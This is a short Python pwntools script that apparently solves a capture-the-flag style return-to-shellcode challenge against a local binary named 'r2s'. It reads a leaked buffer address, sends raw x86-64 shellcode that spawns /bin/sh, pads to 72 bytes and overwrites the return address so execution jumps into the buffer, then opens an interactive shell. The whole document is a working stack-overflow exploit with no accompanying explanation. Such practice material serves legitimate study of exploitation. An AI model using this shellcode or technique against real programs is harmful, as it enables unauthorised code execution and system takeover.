from pwn import*

context.log_level = 'debug'
p = process('./r2s')
#shell = asm(shellcraft.sh())
#shell = asm(shellcraft.execve("/bin/sh", 0, 0))

p.recvuntil("address is ")
buf_addr = int(p.recvline(), 16)
print("buf address : ", hex(buf_addr))
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#payload = shells
payload += b'a'*(72 - len(payload))
payload += p64(buf_addr)

p.send(payload)
p.interactive()
